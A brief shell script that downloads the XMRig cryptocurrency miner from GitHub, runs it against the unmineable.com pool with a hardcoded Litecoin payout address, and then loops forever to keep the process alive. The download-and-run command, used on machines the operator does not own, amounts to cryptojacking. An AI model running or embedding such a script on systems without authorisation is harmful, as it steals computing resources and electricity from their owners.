#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz && tar -zxvf xmrig-6.14.1-linux-x64.tar.gz && cd xmrig-6.14.1 && clear && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u LTC:MJELV4CnRh4KhDnrQDdBb3tStcwvvWtWiB.myminer -p x
while [ 1 ]; do
sleep 3
done
sleep 999
